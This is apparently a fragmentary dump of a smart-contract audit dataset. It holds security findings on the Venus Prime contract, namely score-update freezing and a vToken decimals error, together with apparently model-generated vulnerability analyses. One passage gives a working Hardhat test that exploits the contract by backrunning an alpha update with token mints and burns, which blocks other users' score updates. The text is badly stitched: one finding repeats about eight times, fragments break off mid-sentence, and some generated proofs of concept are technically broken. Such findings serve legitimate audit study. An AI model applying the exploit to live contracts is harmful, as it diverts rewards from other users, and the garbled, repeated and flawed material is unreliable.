XVS stake for revocable tokens\".\n\n\n## Assessed type\n\nOther",

This is done by manipulatively decreasing the value of `pendingScoreUpdates`, then ensuring that only other user scores are updated until `pendingScoreUpdates` reaches zero, at which point calls to `updateScores()` will revert with the error `NoScoreUpdatesRequired()`. This can be done via the attacker calling `updateScores()` to update other users' scores first and/or DoSing calls to `updateScores()` that would update the attacker's score (see the issue titled \"DoS and gas griefing of Prime.updateScores()\").\n\nThe core of this vulnerability is the attacker's ability to manipulate `pendingScoreUpdates`. Notice below that `claim()`, which is called to mint a user's Prime token, doesn't change the value of `pendingScoreUpdates`:\n```\n    function claim() external { \n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) {\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n\n        emit Mint(user, isIrrevocable);\n    }\n    function _initializeMarkets(address account) internal {\n        address[] storage _allMarkets = allMarkets;\n        for (uint256 i = 0; i < _allMarkets.length; ) {\n            address market = _allMarkets[i];\n            accrueInterest(market);\n\n            interests[market][account].rewardIndex = markets[market].rewardIndex;\n            uint256 score = _calculateScore(market, account);\n            interests[market][account].score = score;\n            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n```\nHowever, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`. \n\nAs aforementioned, the attacker can ensure that only other users' scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.\n\nRelevant code from `updateScores()` for reference:\n```\n    function updateScores(address[] memory users) external {\n        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); \n        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();\n\n        for (uint256 i = 0; i < users.length; ) {\n            ...\n            pendingScoreUpdates--;\n            isScoreUpdated[nextScoreUpdateRoundId][user] = true;\n\n            unchecked {\n                i++;\n            }\n\n            emit UserScoreUpdated(user);\n        }\n    }\n```\nAs seen, the attacker's score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker's score. Because rewards are distributed according to the user's score divided by the total score, the attacker can 'freeze' their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.\n\nThe attacker can also prevent score updates for other users. The attacker can 'freeze' a user's score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users. This is because it is possible to decrease the value of `pendingScoreUpdates` by more than one if the attacker mints and burns more than one token after the alpha/multiplier is updated.\n\n## Math to support that a larger score results in greater reward accrual\nLet $a$ represent the attacker's score if it is properly updated after a change in alpha/multiplier, $b$ represent the properly updated total score, and $c$ represent the difference between the attacker's larger unupdated score and the attacker's smaller updated score. Clearly $a$, $b$, and $c$ are positive with $a < b$. Consider the following inequality, which holds true since $a<b$ :\n\n$\\frac{a+c}{b+c} > \\frac{a}{b} \\iff a+c > \\frac{a(b+c)}{b} \\iff a+c > a+\\frac{ac}{b}$\n## Test\nPaste and run the below test in the 'mint and burn' scenario in Prime.ts (line 302)\n```\n    it(\"prevent_Update\", async () => { //test to show attacker can arbitrarily prevent multiple users from being updated by `updateScores()`\n      //setup 3 users\n      await prime.issue(false, [user1.getAddress(), user2.getAddress(), user3.getAddress()]);\n      await xvs.connect(user1).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user2).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user2).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user3).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user3).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker sets up addresses to mint/burn and manipulate pendingScoreUpdates\n      const [,,,,user4,user5] = await ethers.getSigners();\n      await xvs.transfer(user4.address, bigNumber18.mul(1000000));\n      await xvs.transfer(user5.address, bigNumber18.mul(1000000));\n      await xvs.connect(user4).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user4).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user5).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user5).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await mine(90 * 24 * 60 * 60);\n      //change alpha, pendingScoreUpdates changed to 3\n      await prime.updateAlpha(1, 5);\n      //attacker backruns alpha update with minting and burning tokens, decreasing pendingScoreUpdates by 2\n      await prime.connect(user4).claim();\n      await xvsVault.connect(user4).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      await prime.connect(user5).claim();\n      await xvsVault.connect(user5).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker updates user 3, decreasing pendingScoreUpdates by 1\n      await prime.connect(user1).updateScores([user3.getAddress()])\n      //users 1 and 2 won't be updated because pendingScoreUpdates is 0\n      await expect(prime.updateScores([user1.getAddress(), user2.getAddress()])).to.be.revertedWithCustomError(prime, \"NoScoreUpdatesRequired\");\n    });\n```\n## Tools Used\nHardhat\n## Recommended Mitigation Steps\nCheck if `pendingScoreUpdates` is nonzero when a token is minted, and increment it if so. This removes the attacker's ability to manipulate `pendingScoreUpdates`.\n```diff\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) { //@Gas\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n+       if (pendingScoreUpdates != 0) {unchecked{++pendingScoreUpdates;}} \n\n        emit Mint(user, isIrrevocable);\n    }\n```\n## Further Considerations\nThe call to `updateMultipliers()` can be frontrun by the attacker with staking XVS and/or lending/borrowing transactions in order to increase the attacker's score before 'freezing' it.\n\nIf the attacker wants to keep the inflated score, no actions that update the attacker's score can be taken. However, the attacker can claim the outsized rewards earned at any time and as often as desired since `claimInterest()` does not update user scores.\n\nIf anyone has knowledge that the exploit has occurred, it is possible for any user's score in a market to be updated with a call to `accrueInterestAndUpdateScore()`, which can neutralize the attack.\n\nThe required amount of XVS staked for this exploit can be reduced by 1000 if this exploit is combined with the exploit titled \"Irrevocable token holders can instantly mint a revocable token after burning and bypass the minimum XVS stake for revocable tokens\".\n\n\n## Assessed type\n\nOther",

After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2. PoC test\n\nHere is a test where it shows, that `rewardIndex` is still 0 after `Prime.accrueInterest` is called, even though it should be > 0.\n\n<details>\n<summary>PoC test</summary>\n\nTo run the following test:\n\n1. Create `PoC.ts` file under the `tests/hardhat/Prime` path.\n2. Copy the code below and paste it into the `PoC.ts` file.\n3.

In the function, there is a multiplication operation between `exchangeRate` and `balanceOfAccount` variables, which are both `uint256` data types:\n\n  `uint256 supply = (exchangeRate * balanceOfAccount) / EXP_SCALE;`\n\n2. If the product of these two variables exceeds the maximum value that can be stored in a `uint256` data type, it will result in an arithmetic overflow, causing the smart contract to revert the transaction or produce incorrect calculations.\n\n3. Although the result of the multiplication is divided by `EXP_SCALE`, it does not guarantee that the product will not exceed the maximum value of `uint256` data type, especially if `exchangeRate` and `balanceOfAccount` have large values.\n\n4. The vulnerability can lead to broader implications, such as rendering the market inoperative, freezing users' funds, or affecting the correctness of financial invariants maintained by the smart contract.\n\nTo prevent this vulnerability, the developer should consider using safe math operations that revert the transaction if an overflow would occur, reducing the precision factors used in computations, or performing the multiplication in steps, checking for possible overflows at each stage.",
                "poc_patch": "Answer: Yes, the given smart contract code is vulnerable to arithmetic overflow due to unsafe multiplication in financial computation.\n\nType of vulnerability: Arithmetic Overflow due to Unsafe Multiplication in Financial Computation\n\nReason: The smart contract code contains a multiplication operation (exchangeRate * balanceOfAccount) that can potentially result in an arithmetic overflow if the values of exchangeRate and balanceOfAccount are large enough. This issue occurs in the calculation of the 'supply' variable, which is then used later in the '_capitalForScore' function. If an overflow happens, it can lead to incorrect calculations, transaction reverts, or other unintended consequences.\n\nTo generate a proof of concept (PoC), you can provide input values that cause an overflow during the multiplication operation. For example, you can create a scenario where 'exchangeRate' is set to the maximum value for 'uint256' (2^256 - 1), and 'balanceOfAccount' is also set to a large value, such as 2^240. When these values are multiplied, they will exceed the maximum value for 'uint256', causing an arithmetic overflow.\n\nAs a patch, the code should use a safe math library, like OpenZeppelin's SafeMath, to ensure that arithmetic operations do not result in overflows. Alternatively, the developer can reduce the precision factors used in computations, perform multiplication in steps while checking for possible overflows, or scale input variables to ensure intermediate results remain within safe bounds for the data types used.",

After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2. PoC test\n\nHere is a test where it shows, that `rewardIndex` is still 0 after `Prime.accrueInterest` is called, even though it should be > 0.\n\n<details>\n<summary>PoC test</summary>\n\nTo run the following test:\n\n1. Create `PoC.ts` file under the `tests/hardhat/Prime` path.\n2. Copy the code below and paste it into the `PoC.ts` file.\n3.

After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2. PoC test\n\nHere is a test where it shows, that `rewardIndex` is still 0 after `Prime.accrueInterest` is called, even though it should be > 0.\n\n<details>\n<summary>PoC test</summary>\n\nTo run the following test:\n\n1. Create `PoC.ts` file under the `tests/hardhat/Prime` path.\n2. Copy the code below and paste it into the `PoC.ts` file.\n3.

After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2. PoC test\n\nHere is a test where it shows, that `rewardIndex` is still 0 after `Prime.accrueInterest` is called, even though it should be > 0.\n\n<details>\n<summary>PoC test</summary>\n\nTo run the following test:\n\n1. Create `PoC.ts` file under the `tests/hardhat/Prime` path.\n2. Copy the code below and paste it into the `PoC.ts` file.\n3.

After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2. PoC test\n\nHere is a test where it shows, that `rewardIndex` is still 0 after `Prime.accrueInterest` is called, even though it should be > 0.\n\n<details>\n<summary>PoC test</summary>\n\nTo run the following test:\n\n1. Create `PoC.ts` file under the `tests/hardhat/Prime` path.\n2. Copy the code below and paste it into the `PoC.ts` file.\n3.

The function does not interact with any liquidity pool or token prices, so there is no opportunity for an attacker to manipulate the spot price of tokens to artificially inflate their weight and claim higher rewards.\n\nThe function calculates the value of `ratio` as `(xvs / capital)` or `(capital / xvs)`, which will always be in the range of (0, 1). It then calculates the value of `exponentiation` using the `FixedMath.exp` function with the `ratio` and `alphaNumerator` and `alphaDenominator` as inputs. The result is then used to calculate the final score based on the input parameters.\n\nTherefore, the smart contract code is not vulnerable to the DeFi price manipulation vulnerability described.",

Instead, it calculates a score based on the `xvs` and `capital` parameters using a mathematical formula. Therefore, it is not susceptible to the described vulnerability.\n\nTo further illustrate, let's consider a scenario where an attacker tries to manipulate the spot price of synth tokens in a liquidity pool by repeatedly depositing small amounts of the base token (BASE). In this case, the `calculateScore` function would not be involved in the process, and the attacker would still need to exploit the liquidity pool's logic, which is outside the scope of this function.\n\nIn summary, the `calculateScore` function is not vulnerable to the described vulnerability type since it does not rely on the spot price of tokens in a liquidity pool.",

After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2. PoC test\n\nHere is a test where it shows, that `rewardIndex` is still 0 after `Prime.accrueInterest` is called, even though it should be > 0.\n\n<details>\n<summary>PoC test</summary>\n\nTo run the following test:\n\n1. Create `PoC.ts` file under the `tests/hardhat/Prime` path.\n2. Copy the code below and paste it into the `PoC.ts` file.\n3.

        "gt": "\n# Vulnerability details\n\n## Impact\n\nUsers earned rewards are calculated incorrectly because of the incorrect decimals value used to calculate user's `score` and markets `sumOfMembersScore`, which impacts the `delta` that is added to market's `rewardIndex` when `Prime.accrueInterest` function is called.\n\n## Proof of Concept\n\nAll users rewards are calculated with the following formula:\n\n```\nrewards = (rewardIndex - userRewardIndex) * scoreOfUser;\n```\n\nThis means that for user to earn rewards, market's `rewardIndex` needs to periodically increase.\n&nbsp;\n\n`markets[vToken].rewardIndex` is updated (increased), when `Prime.accrueInterest` is called.\n\n\n\n```solidity\n    uint256 delta;\n    if (markets[vToken].sumOfMembersScore > 0) {\n        delta = ((distributionIncome * EXP_SCALE) / markets[vToken].sumOfMembersScore);\n    }\n\n    markets[vToken].rewardIndex = markets[vToken].rewardIndex + delta;\n```\n\nFrom the code snippet above it is assumed that `markets[vToken].sumOfMembersScore` is precision of 18 decimals.\n\nTo ensure that user's `score` and markets `sumOfMemberScore` are correctly calculated, in  function `capital` is adjusted to 18 decimals. After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2. PoC test\n\nHere is a test where it shows, that `rewardIndex` is still 0 after `Prime.accrueInterest` is called, even though it should be > 0.\n\n<details>\n<summary>PoC test</summary>\n\nTo run the following test:\n\n1.

The function _capitalForScore performs financial calculations involving multiplications of large numbers (xvs, borrowMultiplier, supplyMultiplier, and tokenPrice) without proper checks or the use of safe math libraries that prevent such overflows.\n2. Specifically, the following lines of code are susceptible to arithmetic overflow:\n  - uint256 borrowCapUSD = (xvsPrice * ((xvs * markets[market].borrowMultiplier) / EXP_SCALE)) / EXP_SCALE;\n  - uint256 supplyCapUSD = (xvsPrice * ((xvs * markets[market].supplyMultiplier) / EXP_SCALE)) / EXP_SCALE;\n  - uint256 supplyUSD = (tokenPrice * supply) / EXP_SCALE;\n  - uint256 borrowUSD = (tokenPrice * borrow) / EXP_SCALE;\n\n3. If the product of these multiplications exceeds the maximum capacity of the variable type (uint256), it will result in an overflow, causing the smart contract to revert the transaction or produce incorrect calculations.\n\nIn summary, the smart contract function _capitalForScore performs complex financial computations involving multiplications of large numbers without proper checks for arithmetic overflow.

The function _capitalForScore has multiple multiplications involving `xvs`, `borrowMultiplier`, `supplyMultiplier`, `xvsPrice`, `tokenPrice`, `supply`, and `borrow`. If the values of these variables are large, there is a risk of arithmetic overflow.\n2. For example, consider the line `uint256 borrowCapUSD = (xvsPrice * ((xvs * markets[market].borrowMultiplier) / EXP_SCALE)) / EXP_SCALE;`. If `xvsPrice`, `xvs`, and `markets[market].borrowMultiplier` are large numbers, their product can exceed the maximum capacity of the `uint256` data type, leading to an overflow.\n3. Although the code uses the `EXP_SCALE` constant to scale down the intermediate results, it might not be enough to prevent overflows when dealing with extremely large numbers.\n\nTo further validate the vulnerability, you can create a Proof of Concept (PoC) or a patch. Here's an example of a PoC that demonstrates the arithmetic overflow:\n\n   function test_arithmetic_overflow() public {\n       markets[0].borrowMultiplier = 2**256 - 1; // Set an extremely large borrowMultiplier\n       markets[0].supplyMultiplier = markets[0].borrowMultiplier;\n       xvs = markets[0].borrowMultiplier;\n       uint256 xvsPrice = 2**256 - 1; // Set an extremely large xvsPrice\n       uint256 tokenPrice = 2**256 - 1; // Set an extremely large tokenPrice\n       uint256 supply = markets[0].borrowMultiplier;\n       uint256 borrow = markets[0].borrowMultiplier;\n\n       (, , ) = _capitalForScore(xvs, borrow, supply, address(0));\n   }\n\nThis PoC results in an arithmetic overflow due",

Analysis: There is no direct connection to Loan-to-Value (LTV) ratios or liquidation in this function. It focuses on calculating and adjusting `supply` and `borrow` amounts based on their respective caps in USD.\n3. Conclusion: Since the code does not deal with LTV ratios or liquidation, it is not vulnerable to the described vulnerability.

After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2. PoC test\n\nHere is a test where it shows, that `rewardIndex` is still 0 after `Prime.accrueInterest` is called, even though it should be > 0.\n\n<details>\n<summary>PoC test</summary>\n\nTo run the following test:\n\n1. Create `PoC.ts` file under the `tests/hardhat/Prime` path.\n2. Copy the code below and paste it into the `PoC.ts` 